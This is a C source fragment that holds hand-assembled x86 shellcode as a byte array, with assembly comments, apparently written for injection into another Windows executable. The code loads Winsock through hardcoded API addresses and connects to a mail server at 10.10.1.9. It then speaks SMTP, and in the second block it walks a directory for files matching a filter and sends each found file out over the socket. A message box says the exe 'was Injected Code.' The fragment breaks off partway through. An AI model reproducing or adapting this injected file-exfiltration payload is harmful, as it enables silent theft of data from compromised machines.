unsigned char szbuffer[] = 
/*{
	//$begin:
	0xE8,0x0B,0x00,0x00,0x00,              					// call $init
	0x77,0x73,0x32,0x5F,0x33,0x32,0x2E,0x64,0x6C,     		// db 		'ws2_32.dll',0
	0x6C,0x00,               
	
	//$init:												//;$init
	0xB8,0x78,0x1D,0x80,0x7C,              					// mov		eax,7c801d78h	;LoadLibrayA
	0xFF,0xD0,                    							// call	eax
	0xE8,0x00,0x00,0x00,0x00              					// call 	$end
	
	//$wsasatrtup:						
	,0x8D,0x85,0x70,0xFE,0xFF,0xFF            				// lea		eax, [ebp-190h]		
	,0x50                      								// push 	eax
	,0x68,0x02,0x02,0x00,0x00              					// push 	202h
	,0xB8,0x55,0x6A,0xAB,0x71              					// mov		eax, 71AB6A55h
	,0xFF,0xD0                    							// call	eax						;WSAStartup(0x0202,&wsadata)
	,0x85,0xC0                    							// test	eax,eax
	,0x0F,0x85,0xC5,0x02,0x00,0x00            				// jne		$end
//	,0x0F,0x85,0xE1,0x02,0x00,0x00            				// jne		$end
	,0xE8,0x00,0x00,0x00,0x00              					// call	$socket
	
	//$socket:
	,0x6A,0x00                    							// push	0
	,0x6A,0x01                    							// push	1
	,0x6A,0x02                    							// push	2
	,0xB8,0x11,0x42,0xAB,0x71              					// mov		eax, 71ab4211h
	,0xFF,0xD0                    							// call	eax				
	,0x89,0x45,0xE0                  						// mov		[ebp-20h],eax
	
	,0xB8,0xFF,0x00,0x00,0x00              					// mov		eax,0FFh
	,0x39,0x45,0xE0                  						// cmp     [ebp-20h],eax	;if(server == 
	,0x75,0x07                    							// jne     $connect 
	,0x31,0xC0                    							// xor     eax,eax
 	,0xE9,0x90,0x02,0x00,0x00								// jmp     $WSACleanup
// 	,0xE9,0xAC,0x02,0x00,0x00								// jmp     $WSACleanup
	//$connect:
	,0x66,0xB8,0x02,0x00                					// mov		ax, 0002h
	,0x66,0x89,0x45,0xD8                					// mov		[ebp-20h-8h], ax
	,0xB8,0x0A,0x0A,0x01,0x09              					// mov		eax, 9010A0Ah
	,0x89,0x45,0xDC                  						// mov		[ebp-20h-4h], eax
	,0x66,0xB8,0x00,0x19                					// mov		ax, 1900h
	,0x66,0x89,0x45,0xDA                					// mov		[ebp-20h-6h], ax
	,0x6A,0x10                    							// push	10h					; push
	,0x8D,0x4D,0xD8                  						// lea		ecx,[ebp-20h-8h]
	,0x51                      									//push 	ecx
	,0x8B,0x45,0xE0                  						// mov		eax, [ebp-20h]
	,0x50                      								// push 	eax
	,0xB8,0x07,0x4A,0xAB,0x71              					// mov		eax, 71ab4a07h		; connect
	,0xFF,0xD0                    							// call	eax
	
	,0x89,0x45,0xD4                  						// mov		[ebp-20h-8h-4h],eax	;nRet
	,0xB8,0x00,0x00,0x00,0x00              					// mov		eax, 0H
	,0x39,0x45,0xD4                  						// cmp     [ebp-20h-8h-4h],eax	;	if(nRet == 0)
	,0x0F,0x85,0x48,0x02,0x00,0x00 							// jne     $closesocket 
//	,0x0F,0x85,0x64,0x02,0x00,0x00 							// jne     $closesocket 
	//$send1: 		
	,0x6A,0x00                    							// push	0
	,0x6A,0x10                    							// push	16
//	,0xE8,0x13,0x00,0x00,0x00								// 	call 	_send1Imp
	,0xE8,0x11,0x00,0x00,0x00								// 	call 	_send1Imp
	,0x48,0x45,0x4C,0x4F,0x20,0x31,0x30,0x2E,0x31     		// db 		'HELO 10.10.1.9\r\n',0
//	,0x30,0x2E,0x31,0x2E,0x39,0x5C,0x72,0x5C,0x6E
//	,0x00                 
	,0x30,0x2E,0x31,0x2E,0x39,0x0D,0x0A,0x00
	//_send1Imp:
	,0x8B,0x45,0xE0											// mov		eax, [ebp-20h]
	,0x50													// push	eax
	,0xB8,0x27,0x4C,0xAB,0x71								//       	mov		eax, 71ab4c27h
	,0xFF,0xD0												// call	eax
	,0x89,0x45,0xD4                  						// mov		[ebp-20h-8h-4h],eax		;nRe
	,0xB8,0x10,0x00,0x00,0x00              					// mov		eax, 10H
	,0x39,0x45,0xD4                  						// cmp     [ebp-20h-8h-4h],eax	;	if(nRet == 1
	,0x0F,0x85,0x12,0x02,0x00,0x00       					// jne     $closesocket 
//	,0x0F,0x85,0x2C,0x02,0x00,0x00       					// jne     $closesocket 
	//$send2: 	
	,0x6A,0x00                    							// push	0
	,0x6A,0x0C                    							// push	0Ch
//	,0xE8,0x0F,0x00,0x00,0x00              					// call 	_send2Imp
	,0xE8,0x0D,0x00,0x00,0x00              					// call 	_send2Imp
	,0x41,0x55,0x54,0x4F,0x20,0x4C,0x4F,0x47,0x49     		// db 		'AUTO LOGIN\r\n',0
//	,0x4E,0x5C,0x72,0x5C,0x6E,0x00       
	,0x4E,0x0D,0x0A,0x00       
	//_send2Imp:
	,0x8B,0x45,0xE0                  						// mov		eax, [ebp-20h]
	,0x50                      								// push	eax
	,0xB8,0x27,0x4C,0xAB,0x71              					// mov		eax, 71ab4c27h
	,0xFF,0xD0                    							// call	eax
	,0x89,0x45,0xD4                  						// mov		[ebp-20h-8h-4h],eax		;nRet
	,0xB8,0x0C,0x00,0x00,0x00              					// mov		eax, 0Ch
	,0x39,0x45,0xD4                  						// cmp     [ebp-20h-8h-4h],eax		;	if(nRet == 0Ch)
	,0x0F,0x85,0xE0,0x02,0x00,0x00            	//jne     $closesocket
//	,0x0F,0x85,0xF8,0x01,0x00,0x00            	//jne     $closesocket
	//$send3: 	
	,0x6A,0x00                    	//push	0
	,0x6A,0x21                    	//push	21h
	,0xE8,0x22,0x00,0x00,0x00              	//call 	_send3Imp
//	,0xE8,0x24,0x00,0x00,0x00              	//call 	_send3Imp
	,0x4D,0x41,0x49,0x4C,0x20,0x46,0x52,0x4F,0x4D    	//db 		'MAIL FROM: liujiquan@ase.com.cn\\r\\n',0
	,0x3A,0x20,0x6C,0x69,0x75,0x6A,0x69,0x71,0x75
	,0x61,0x6E,0x40,0x61,0x73,0x65,0x2E,0x63,0x6F
//	,0x6D,0x2E,0x63,0x6E,0x5C,0x72,0x5C,0x6E,0x00 	              
	,0x6D,0x2E,0x63,0x6E,0x0D,0x0A,0x00
	//_send3Imp:
	,0x8B,0x45,0xE0                  						//mov		eax, [ebp-20h]
	,0x50                      								//push	eax
	,0xB8,0x27,0x4C,0xAB,0x71              					//mov		eax, 71ab4c27h
	,0xFF,0xD0                    							//call	eax
	,0x89,0x45,0xD4                  						//mov		[ebp-20h-8h-4h],eax		;nRet
	,0xB8,0x21,0x00,0x00,0x00              					//mov		eax, 21h
	,0x39,0x45,0xD4                  						//cmp     [ebp-20h-8h-4h],eax	;	if(nRet == 21h)
	,0x0F,0x85,0x99,0x01,0x00,0x00 							//jne     $closesocket 
//	,0x0F,0x85,0xAF,0x01,0x00,0x00 							//jne     $closesocket 
	//$send4: 	
	,0x6A,0x00                    							//push	0
	,0x6A,0x1F                    							//push	1Fh
	,0xE8,0x20,0x00,0x00,0x00              					//call 	_send4Imp
//	,0xE8,0x22,0x00,0x00,0x00              					//call 	_send4Imp
	,0x52,0x43,0x50,0x54,0x20,0x54,0x4F,0x3A,0x20     		//db 		'RCPT TO: liujiquan@ase.com.cn\\r\\n',0
	,0x6C,0x69,0x75,0x6A,0x69,0x71,0x75,0x61,0x6E
	,0x40,0x61,0x73,0x65,0x2E,0x63,0x6F,0x6D,0x2E
	,0x63,0x6E,0x0D,0x0A,0x00
//	,0x63,0x6E,0x5C,0x72,0x5C,0x6E,0x00
	//_send4Imp:
	,0x8B,0x45,0xE0                  						//mov		eax, [ebp-20h]
	,0x50                      								//push	eax
	,0xB8,0x27,0x4C,0xAB,0x71              					//mov		eax, 71ab4c27h
	,0xFF,0xD0                    							//call	eax
	,0x89,0x45,0xD4                  						//mov		[ebp-20h-8h-4h],eax		;nRet
	,0xB8,0x1F,0x00,0x00,0x00              					//mov		eax, 1Fh
	,0x39,0x45,0xD4                  						//cmp     [ebp-20h-8h-4h],eax	;	if(nRet == 21h)
	,0x0F,0x85,0x54,0x01,0x00,0x00                   							//jne     $closesocket 
//	,0x0F,0x85,0x68,0x01,0x00,0x00                   							//jne     $closesocket 
	//$send5: 	
	,0x6A,0x00                    							//push	0
	,0x6A,0x06                    							//push	06h
	,0xE8,0x07,0x00,0x00,0x00              					//call 	_send5Imp
//	,0xE8,0x09,0x00,0x00,0x00              					//call 	_send5Imp
	,0x44,0x41,0x54,0x41,0x0D,0x0A,0x00     				//db 		'DATA\\r\\n',0            
//	,0x44,0x41,0x54,0x41,0x5C,0x72,0x5C,0x6E,0x00 
	//_send5Imp:
	,0x8B,0x45,0xE0                  						//mov		eax, [ebp-20h]
	,0x50                      								//push	eax
	,0xB8,0x27,0x4C,0xAB,0x71              					//mov		eax, 71ab4c27h
	,0xFF,0xD0                    							//call	eax
	,0x89,0x45,0xD4                  						//mov		[ebp-20h-8h-4h],eax		;nRet
	,0xB8,0x06,0x00,0x00,0x00              					//mov		eax, 06h
	,0x39,0x45,0xD4                  						//cmp     [ebp-20h-8h-4h],eax	;	if(nRet == 21h)
	,0x0F,0x85,0x28,0x01,0x00,0x00                  							//jne     $closesocket 
//	,0x0F,0x85,0x3A,0x01,0x00,0x00                  							//jne     $closesocket 

	//$send6: 	
	,0x6A,0x00                    							//push	0
	,0x68,0xA7,0x00,0x00,0x00              					//push	0A7h
	,0xE8,0xA8,0x00,0x00,0x00              					//call 	_send6Imp
//	,0xE8,0xB4,0x00,0x00,0x00              					//call 	_send6Imp
	,0x46,0x72,0x6F,0x6D,0x3A,0x20,0x3C,0x6C,0x69			//db 		'From: <liujiquan@ase.com.cn>\\r\\nTo: <liujiquan@ase.com.cn>\\r\\nDate: 2014/09/17 16:57\\r\\nSubject:One Mail\\r\\nMime-Version: 1.0\\r\\nContent-Type: multipart/mixed; boundary=\"INVT\"\\r\\n',0
	,0x75,0x6A,0x69,0x71,0x75,0x61,0x6E,0x40,0x61
	,0x73,0x65,0x2E,0x63,0x6F,0x6D,0x2E,0x63,0x6E
	 
	,0x3E,0x0D,0x0A,0x54,0x6F,0x3A,0x20,0x3C,0x6C
	,0x69,0x75,0x6A,0x69,0x71,0x75,0x61,0x6E,0x40
	,0x61,0x73,0x65,0x2E,0x63,0x6F,0x6D,0x2E,0x63
	,0x6E,0x3E,0x0D,0x0A,0x44,0x61,0x74,0x65,0x3A
	,0x20,0x32,0x30,0x31,0x34,0x2F,0x30,0x39,0x2F
	,0x31,0x37,0x20,0x31,0x36,0x3A,0x35,0x37,0x0D
	,0x0A,0x53,0x75,0x62,0x6A,0x65,0x63,0x74,0x3A
	,0x4F,0x6E,0x65,0x20,0x4D,0x61,0x69,0x6C,0x0D
	,0x0A,0x4D,0x69,0x6D,0x65,0x2D,0x56,0x65,0x72
	,0x73,0x69,0x6F,0x6E,0x3A,0x20,0x31,0x2E,0x30
	,0x0D,0x0A,0x43,0x6F,0x6E,0x74,0x65,0x6E,0x74
	,0x2D,0x54,0x79,0x70,0x65,0x3A,0x20,0x6D,0x75
	,0x6C,0x74,0x69,0x70,0x61,0x72,0x74,0x2F,0x6D
	,0x69,0x78,0x65,0x64,0x3B,0x20,0x62,0x6F,0x75
	,0x6E,0x64,0x61,0x72,0x79,0x3D,0x22,0x49,0x4E
	,0x56,0x54,0x22,0x0D,0x0A,0x00
/*	,0x3E,0x5C,0x72,0x5C,0x6E,0x54,0x6F,0x3A,0x20
	,0x3C,0x6C,0x69,0x75,0x6A,0x69,0x71,0x75,0x61
	,0x6E,0x40,0x61,0x73,0x65,0x2E,0x63,0x6F,0x6D
	,0x2E,0x63,0x6E,0x3E,0x5C,0x72,0x5C,0x6E,0x44
	,0x61,0x74,0x65,0x3A,0x20,0x32,0x30,0x31,0x34
	,0x2F,0x30,0x39,0x2F,0x31,0x37,0x20,0x31,0x36
	,0x3A,0x35,0x37,0x5C,0x72,0x5C,0x6E,0x53,0x75
	,0x62,0x6A,0x65,0x63,0x74,0x3A,0x4F,0x6E,0x65
	,0x20,0x4D,0x61,0x69,0x6C,0x5C,0x72,0x5C,0x6E
	,0x4D,0x69,0x6D,0x65,0x2D,0x56,0x65,0x72,0x73
	,0x69,0x6F,0x6E,0x3A,0x20,0x31,0x2E,0x30,0x5C
	,0x72,0x5C,0x6E,0x43,0x6F,0x6E,0x74,0x65,0x6E
	,0x74,0x2D,0x54,0x79,0x70,0x65,0x3A,0x20,0x6D
	,0x75,0x6C,0x74,0x69,0x70,0x61,0x72,0x74,0x2F
	,0x6D,0x69,0x78,0x65,0x64,0x3B,0x20,0x62,0x6F
	,0x75,0x6E,0x64,0x61,0x72,0x79,0x3D,0x22,0x49
	,0x4E,0x56,0x54,0x22,0x5C,0x72,0x5C,0x6E,0x00 
*/	//_send6Imp:
/*	,0x8B,0x45,0xE0                  					//mov		eax, [ebp-20h]
	,0x50                      							//push	eax
	,0xB8,0x27,0x4C,0xAB,0x71              				//mov		eax, 71ab4c27h
	,0xFF,0xD0                    						//call	eax
	,0x89,0x45,0xD4                  					//mov		[ebp-20h-8h-4h],eax		;nRet
	,0xB8,0xA7,0x00,0x00,0x00              				//mov		eax, 0A7h
	,0x39,0x45,0xD4                  					//cmp     [ebp-20h-8h-4h],eax	;	if(nRet == 21h)
	,0x75,0x5C                    						//jne     $closesocket 
//	,0x75,0x62                    						//jne     $closesocket 

	//$send7: 	
	,0x6A,0x00                    						//push	0
	,0x6A,0x0D                    						//push	0Dh
	,0xE8,0x0E,0x00,0x00,0x00              				//call 	_send7Imp
//	,0xE8,0x12,0x00,0x00,0x00              				//call 	_send7Imp
//	,0x2D,0x2D,0x49,0x4E,0x56,0x54,0x2D,0x2D,0x5C		//	db 		'--INVT--\\r\\n.\\r\\n',0          
//	,0x72,0x5C,0x6E,0x2E,0x5C,0x72,0x5C,0x6E,0x00 
	,0x2D,0x2D,0x49,0x4E,0x56,0x54,0x2D,0x2D,0x0D	     //db 		'--INVT--',0Dh,0Ah,'.',0Dh,0Ah,0
	,0x0A,0x2E,0x0D,0x0A,0x00  	

	//_send7Imp:
	,0x8B,0x45,0xE0                  					//mov		eax, [ebp-20h]
	,0x50                      							//push	eax
	,0xB8,0x27,0x4C,0xAB,0x71              				//mov		eax, 71ab4c27h
	,0xFF,0xD0                    						//call	eax
	,0x89,0x45,0xD4                  					//mov		[ebp-20h-8h-4h],eax		;nRet
	,0xB8,0x0D,0x00,0x00,0x00              				//mov		eax, 0Dh
	,0x39,0x45,0xD4                  					//cmp     [ebp-20h-8h-4h],eax	;	if(nRet == 21h)
	,0x75,0x2D                    						//jne     $closesocket 
//	,0x75,0x2F                    						//jne     $closesocket 
	
	//$send8: 	
	,0x6A,0x00                    						//push	0
	,0x6A,0x06                    						//push	06H
	,0xE8,0x07,0x00,0x00,0x00              				//call 	_send8Imp
//	,0xE8,0x09,0x00,0x00,0x00              				//call 	_send8Imp              
//	,0x51,0x55,0x49,0x54,0x5C,0x72,0x5C,0x6E,0x00		//db 		'QUIT\r\n',0
	,0x51,0x55,0x49,0x54,0x0D,0x0A,0x00
	//_send8Imp:
	,0x8B,0x45,0xE0                  					//mov		eax, [ebp-20h]
	,0x50                      							//push	eax
	,0xB8,0x27,0x4C,0xAB,0x71              				///mov		eax, 71ab4c27h
	,0xFF,0xD0                    						//call	eax
	,0x89,0x45,0xD4                  					//mov		[ebp-20h-8h-4h],eax		;nRet
	,0xB8,0x06,0x00,0x00,0x00             				//mov		eax, 06H
	,0x39,0x45,0xD4                  					//cmp     [ebp-20h-8h-4h],eax	;	if(nRet == 21h)
	,0x75,0x05                    						//jne     $closesocket 	

	//$Msg:
	,0xE8,0x24,0x00,0x00,0x00              					// call 	Message
	//$closesocket: 
	,0x8B,0x45,0xE0                  						// mov		eax, [ebp-20h]
	,0x50                      								// push	eax	
	,0xB8,0x2B,0x3E,0xAB,0x71              					// mov		eax, 0x71ab3e2b
	,0xFF,0xD0                    							// call	eax
	,0x89,0x45,0xD4                  						// mov		[ebp-20h-8h-4h],eax		;nRet
	
	//$WSACleanup: 
	,0xB8,0xED,0x3F,0xAB,0x71              					// mov		eax, 0x71ab3fed
	,0xFF,0xD0                    							// call	eax
	,0x89,0x45,0xD4                  						// mov		[ebp-20h-8h-4h],eax		;nRet
	,0xE8,0x00,0x00,0x00,0x00              					// call	$end
	
	//$end:
	,0xB8,0x50,0x1F,0x40,0x00              					// mov		eax,00401f50H	;jmp end
	,0xFF,0xE0                    							// jmp		eax	
	//Message:	
	,0xE8,0x0B,0x00,0x00,0x00              					// call func0
	,0x75,0x73,0x65,0x72,0x33,0x32,0x2E,0x64,0x6C     		// db 'user32.dll',0  
	,0x6C,0x00               
	//func0:
	,0xB8,0x7B,0x1D,0x80,0x7C              					// mov eax,7c801d7bH   ;LOADLIBRARYA
	,0xFF,0xD0                    							// CALL eax
	,0x6A,0x00                    							// push 0           
	,0xE8,0x0B,0x00,0x00,0x00              					// call Func1
	,0x49,0x6E,0x66,0x6F,0x6D,0x61,0x74,0x69,0x6F     		// db "Infomation",0   
	,0x6E,0x00               
	//Func1:
	,0xE8,0x1C,0x00,0x00,0x00              					// call Func2
	,0x54,0x68,0x69,0x73,0x20,0x65,0x78,0x65,0x20     		// db "This exe was Injected Code.",0
	,0x77,0x61,0x73,0x20,0x49,0x6E,0x6A,0x65,0x63
	,0x74,0x65,0x64,0x20,0x43,0x6F,0x64,0x65,0x2E
	,0x00                 
	//Func2:
	,0x6A,0x00                    							// push 0  
	,0xB8,0xEA,0x07,0x45,0x7E              					// mov eax,7e4507eaH  ; 7e4507eaH  MESSAGEBOXA 
	,0xFF,0xD0                    							// call eax
	,0xC3                      								// ret	
};*/
/*
{
 0x55                      							//push	ebp			
,0x89,0xE5                    						//mov	ebp,esp		
,0x81,0xEC,0x00,0x04,0x00,0x00            			//sub	esp,400H
,0x53                      							//push	ebx
,0x56                     							//push	esi
,0x57                      							//push	edi
,0x8D,0xBD,0x00,0xFC,0xFF,0xFF            			//lea	edi, [ebp-200H]
,0xB9,0x80,0x00,0x00,0x00              				//mov	ecx, 80H	
,0xB8,0x00,0x00,0x00,0x00              				//mov	eax, 0H				
,0xF3,0xAB                    						//rep		stosd
,0xE8,0x0B,0x00,0x00,0x00							//call	$init
,0x77,0x73,0x32,0x5F,0x33,0x32,0x2E,0x64,0x6C		//	db 	'ws2_32.dll',0
,0x6C,0x00               
													 //$init:
													//	;	mov	eax, szBuffer
													//	;	push	eax
,0xB8,0x7B,0x1D,0x80,0x7C							//	mov	eax,7c801d7bH   ;LOADLIBRARY	
,0xFF,0xD0											//	call	eax
													//$wsasatrtup:
,0x8D,0x85,0x70,0xFE,0xFF,0xFF						//	lea	eax, [ebp-190h]
,0x50												//	push 	eax
,0x68,0x02,0x02,0x00,0x00							//	push 	202h
,0xB8,0x55,0x6A,0xAB,0x71							//	mov	eax, 71AB6A55h
,0xFF,0xD0											//	call	eax
,0x85,0xC0											//	test	eax,eax
,0x0F,0x85,0x75,0x05,0x00,0x00						//	jne	$end
													//$socket:
,0x6A,0x00											//	push	0
,0x6A,0x01											//	push	1
,0x6A,0x02											//	push	2
,0xB8,0x11,0x42,0xAB,0x71							//	mov	eax, 71ab4211h
,0xFF,0xD0											//	call  eax						;socket(AF_INET,SOCK_STREAM,IPPROTO_IP); 
,0x89,0x45,0xE0										//	mov		[ebp-20h],eax
,0xB8,0xFF,0x00,0x00,0x00							//	mov		eax,0FFh
,0x39,0x45,0xE0										//	cmp     [ebp-20h],eax	;if(server == -1)
,0x75,0x07											//	jne     $connect 
,0x31,0xC0											//	xor     eax,eax
,0xE9,0x4A,0x05,0x00,0x00							//	jmp     $WSACleanup	
            //$connect:
,0x66,0xB8,0x02,0x00								//	mov		ax, 0002h
,0x66,0x89,0x45,0xD8								//	mov		[ebp-20h-8h], ax
,0xB8,0x0A,0x0A,0x01,0x09							//	mov		eax, 9010A0Ah
,0x89,0x45,0xDC										//	mov		[ebp-20h-4h], eax
,0x66,0xB8,0x00,0x19								//	mov		ax, 1900h
,0x66,0x89,0x45,0xDA								//	mov		[ebp-20h-6h], ax
,0x6A,0x10											//	push	10h					; push
,0x8D,0x4D,0xD8										//	lea		ecx,[ebp-20h-8h]
,0x51												//	push 	ecx
,0x8B,0x45,0xE0										//	mov		eax, [ebp-20h]
,0x50												//	push 	eax
,0xB8,0x07,0x4A,0xAB,0x71							//	mov		eax, 71ab4a07h		; connect
,0xFF,0xD0											//	call	eax
													//	
,0x89,0x45,0xD4										//	mov		[ebp-20h-8h-4h],eax	;nRet
,0xB8,0x00,0x00,0x00,0x00							//	mov		eax, 0H
,0x39,0x45,0xD4										//	cmp     [ebp-20h-8h-4h],eax	;	if(nRet == 0)
,0x0F,0x85,0x02,0x05,0x00,0x00						//	jne     $closesocket 
													//;First:sendprepare
,0x8B,0x45,0xE0										//	mov		eax,[ebp-20h]
,0x50												//	push	eax
,0xE8,0x20,0x00,0x00,0x00							//	call	$sendprepare
,0x83,0xC4,0x04										//	add		esp,4
													//;Second:sendfile
,0x8B,0x45,0xE0                  					// mov		eax,[ebp-20h]
,0x50                      							// push	eax
,0xE8,0x68,0x00,0x00,0x00              				// call	$sendfilemain
,0x83,0xC4,0x04                  					// add		esp,4
													//;Third:sendExit
,0x8B,0x45,0xE0										//	mov		eax,[ebp-20h]
,0x50												//	push	eax											//
,0xE8,0x9D,0x04,0x00,0x00							//	call	$sendExit
,0x83,0xC4,0x04										//	add		esp,4
,0xE9,0xD9,0x04,0x00,0x00							//	jmp		$closesocket
													//$sendprepare:
,0x55												//	push	ebp			
,0x89,0xE5											//	mov		ebp,esp		
,0x81,0xEC,0x00,0x02,0x00,0x00						//	sub		esp,200H
,0x53												//	push	ebx
,0x56												//	push	esi
,0x57												//	push	edi
,0x8D,0xBD,0x00,0xFE,0xFF,0xFF						//	lea		edi, [ebp-200H]
,0xB9,0x40,0x00,0x00,0x00							//	mov		ecx,40H	
,0xB8,0x00,0x00,0x00,0x00							//	mov		eax, 0H				
,0xF3,0xAB											//	rep		stosd

													//	
,0xBB,0xD8,0x05,0x00,0x00            				//  mov		ebx, szPrepare
,0x01,0xF3                    						//  add		ebx, esi
,0x53												//	push	ebx			;szPrepare	
,0xB8,0x45,0x26,0x90,0x7C							//	mov		eax,7c902645H
,0xFF,0xD0											//	call	eax
,0x83,0xC4,0x04										//	add		esp, 4
,0x89,0x45,0xFC										//	mov		[ebp-4H],eax
													//	
,0xB8,0x00,0x00,0x00,0x00							//	mov		eax, 0H
,0x50												//	push	eax
,0x8B,0x45,0xFC										//	mov		eax, [ebp-4H]
,0x50												//	push	eax
,0x53												//	push	ebx			;szPrepare	
,0x8B,0x45,0x08										//	mov		eax, [ebp+12]
,0x50												//	push	eax
,0xB8,0x27,0x4C,0xAB,0x71							//	mov		eax, 71ab4c27H
,0xFF,0xD0											//	call	eax					;send(server, szBuffer, strlen(szBuffer), 0);
													//
,0x5F												//	pop		edi
,0x5E												//	pop		esi
,0x5B												//	pop		ebx
,0x81,0xC4,0x00,0x02,0x00,0x00						//	add		esp,200H
,0x5D												//	pop     ebp	
,0xC3												//	ret
													//$sendfilemain:	;1)searchfile 2)sendfile
,0x55												//	push	ebp			
,0x89,0xE5											//	mov		ebp,esp		
,0x83,0xEC,0x0C										//	sub		esp,0CH
,0x53												//	push	ebx
,0x56												//	push	esi
,0x57												//	push	edi
,0x8D,0x7D,0xF4										//	lea		edi, [ebp-0CH]
,0xB9,0x03,0x00,0x00,0x00							//	mov		ecx,3H	
,0xB8,0x00,0x00,0x00,0x00							//	mov		eax, 0H				
,0xF3,0xAB											//	rep		stosd
													//
,0x8B,0x45,0x08										//	mov		eax, [ebp+8]
,0x50												//	push	eax		;server
,0xBB,0x88,0x07,0x00,0x00							//	mov		ebx,szFilter
,0x01,0xF3											//	add		ebx, esi
,0x53						                 		//  push	ebx
,0xBB,0x8E,0x07,0x00,0x00							//	mov		ebx, szPath
,0x01,0xF3											//	add 	ebx, esi
,0x53												//	push	ebx
,0xE8,0x08,0x00,0x00,0x00							//	call	$searchfile 
,0x83,0xC4,0x0C										//	add		esp, 12		
,0xE9,0xFE,0x03,0x00,0x00							//	jmp		$_END
													//$searchfile:
,0x55												//	push	ebp			
,0x89,0xE5											//	mov		ebp,esp		
,0x81,0xEC,0x00,0x04,0x00,0x00						//	sub		esp,400H
,0x53												//	push	ebx
,0x56												//	push	esi
,0x57												//	push	edi
,0x8D,0xBD,0x00,0xFE,0xFF,0xFF						//	lea		edi, [ebp-200H]
,0xB9,0x80,0x00,0x00,0x00							//	mov		ecx,80H	; 
,0xB8,0x00,0x00,0x00,0x00							//	mov		eax, 0H				
,0xF3,0xAB											//	rep		stosd
													//
,0x8B,0x45,0x08										//	mov		eax,[ebp+8]		; strPath
,0x8B,0x5D,0x0C										//	mov		ebx,[ebp+12]	; strFilter
													//	
,0xB9,0x00,0x00,0x00,0x00							//	mov		ecx,0H			
,0x39,0xC8											//	cmp		eax, ecx
,0x0F,0x84,0xD4,0x01,0x00,0x00						//	je		_searchfileend	; strPath == NULL 
,0x39,0xCB											//	cmp		ebx, ecx
,0x0F,0x84,0xCC,0x01,0x00,0x00						//	je		_searchfileend	; strFilter == NULL
													//_findfile:
													//	;sprintf(szFilePath, "%s%s",strPath, strFilter);		
,0x8D,0x8D,0xFC,0xFE,0xFF,0xFF						//	lea		ecx, [ebp-104h]				;TCHAR szFilePath[MAX_PATH] 
,0x53												//	push	ebx
,0x50												//	push	eax
,0x51												//	push    ecx
,0xE8,0xC9,0x01,0x00,0x00							//	call	$sprintf
,0x83,0xC4,0x0C										//	add		esp,12
													//
													//	;long handle = (long)::FindFirstFile(szFilePath, &findData);
,0x8D,0x85,0xBC,0xFD,0xFF,0xFF						//	lea		eax, [ebp-140h-104h]		;$findData
,0x50												//	push    eax
,0x8D,0x85,0xFC,0xFE,0xFF,0xFF						//	lea		eax, [ebp-104h]				;$szFilePath
,0x50												//	push	eax	
,0xB8,0xF9,0xF9,0x82,0x7C							//	mov		eax, 7c82f9f9H
,0xFF,0xD0											//	call	eax
,0x89,0x85,0xB8,0xFD,0xFF,0xFF						//	mov		[ebp-104h-140h-4H],eax		;$handle 0x00148968
													//
													//	;if(handle != 0xFFFFFFFF)
,0xBB,0xFF,0xFF,0xFF,0xFF							//	mov		ebx, 0FFFFFFFFH
,0x3B,0x9D,0xB8,0xFD,0xFF,0xFF						//	cmp		ebx, [ebp-104h-140h-4H]			;
,0x0F,0x84,0x8F,0x00,0x00,0x00						//	je		_finddir
													//	
													//	;BOOL bRet = TRUE;
,0x8D,0x85,0xB4,0xFD,0xFF,0xFF						//	lea		eax, [ebp-104h-140h-4H-4H]	
,0xB8,0x01,0x00,0x00,0x00							//	mov		eax, 1	
,0x89,0x85,0xB4,0xFD,0xFF,0xFF						//	mov		[ebp-104h-140h-4H-4H], eax
													//_findfile_while:
													//	;memset(szFilePath, 0x00, MAX_PATH);
,0x68,0x04,0x01,0x00,0x00							//	push    104H	
,0x8D,0x85,0xFC,0xFE,0xFF,0xFF						//	lea		eax,  [ebp-104h]
,0x50												//	push    eax
,0xE8,0xB6,0x01,0x00,0x00							//	call	$memset
,0x83,0xC4,0x08										//	add		esp, 8
													//	
													//	;sprintf(szFilePath, "%s\\%s",strPath, findData.cFileName);
,0x8D,0x85,0xE8,0xFD,0xFF,0xFF						//	lea		eax, [ebp-104h-114H]		;$findData.cFileName
,0x50												//	push    eax		
,0x8B,0x45,0x08										//	mov		eax, [ebp+8]				
,0x50												//	push    eax						; strPath
,0x8D,0x85,0xFC,0xFE,0xFF,0xFF						//	lea		eax, [ebp-104h]					;$szFilePath
,0x50												//	push	eax	 
,0xE8,0x5E,0x01,0x00,0x00							//	call    $sprintf
,0x83,0xC4,0x0C										//	add		esp, 12
													//	
,0x8B,0x45,0x10										//	mov		eax, [ebp+16]
,0x50												//	push	eax		;server
,0x8D,0x85,0xFC,0xFE,0xFF,0xFF						//	lea		eax, [ebp-104h]					;$szFilePath
,0x50												//	push	eax	 
,0x8D,0x85,0xE8,0xFD,0xFF,0xFF						//	lea		eax, [ebp-104h-114H]			;$findData.cFileName
,0x50												//	push    eax	
,0xE8,0xB6,0x01,0x00,0x00							//	call	$sendfile
,0x83,0xC4,0x0C										//	add		esp, 12
													//_findfile_next:
													//	;bRet = FindNextFile((HANDLE)handle, &findData);
,0x8D,0x85,0xBC,0xFD,0xFF,0xFF						//	lea		eax, [ebp-140h-104h]		;$findData
,0x50												//	push    eax
,0x8B,0x85,0xB8,0xFD,0xFF,0xFF						//	mov		eax,[ebp-104h-140h-4H]
,0x50												//	push    eax			;handle
,0xB8,0x51,0x4F,0x83,0x7C							//	mov		eax, 7c834f51H
,0xFF,0xD0											//	call    eax
,0x89,0x85,0xB4,0xFD,0xFF,0xFF						//	mov     [ebp-104h-140h-4H-4H], eax	;bRet
,0xB8,0x01,0x00,0x00,0x00							//	mov		eax, 1
,0x3B,0x85,0xB4,0xFD,0xFF,0xFF						//	cmp		eax, [ebp-104h-140h-4H-4H]
,0x74,0x90											//	je		_findfile_while
													//_findfile_close:
													//	;FindClose((HANDLE)handle);
,0x8B,0x85,0xE8,0xFD,0xFF,0xFF						//	mov		eax, [ebp-104h-114H]
,0x50												//	push	eax
,0xB8,0x9C,0xEE,0x80,0x7C							//	mov		eax, 7c80ee9cH
,0xFF,0xD0											//	call	eax	
													//_finddir:
,0xB8,0x01,0x00,0x00,0x00							//	mov 	eax,1
,0x89,0x85,0xB4,0xFD,0xFF,0xFF						//	mov     [ebp-104h-140h-4H-4H], eax	;bRet
													//	;memset(szFilePath, 0x00, MAX_PATH);
,0x68,0x04,0x01,0x00,0x00							//	push    104H	
,0x8D,0x85,0xFC,0xFE,0xFF,0xFF						//	lea		eax,  [ebp-104h]
,0x50												//	push    eax
,0xE8,0x2D,0x01,0x00,0x00							//	call	$memset
